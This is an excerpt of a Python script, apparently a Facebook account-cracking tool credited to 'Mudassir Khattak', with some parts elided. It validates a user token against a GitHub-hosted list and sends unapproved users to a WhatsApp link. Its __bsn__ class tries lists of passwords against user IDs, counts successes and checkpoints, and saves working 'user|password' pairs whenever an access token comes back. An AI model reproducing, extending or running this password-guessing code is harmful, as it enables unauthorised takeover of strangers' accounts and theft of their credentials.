...
def reg():
    ...
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.RtMudassir6.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/veerkoko/khattakjani/main/khattak.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        os.system('xdg-open https://whatsapp.me/+923439635677?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
        reg()
...
def reg2():
    ...
    sav = open('/sdcard/Android/.RtMudassir6.txt', 'w')
    sav.write(id)
    sav.close()
    reg()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print(" [*]. CREATED BY |:-( Mudassir Khattak )");time.sleep (0.03)
    print(" [*]. Facebook   . (Veer Khanoo)");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(" [*]. VERSION  3.0                                    ");time.sleep (0.03)   
    print(" [*]. WP             +923439635677      ");time.sleep (0.03)
    print(" [*]. This Tool was created by Khattak Saab              ");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
    print(" [*] A N O N Y M O U S  D A R K F A T E  ( Mudassir )    ");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [Mudassir] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-mudassir] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
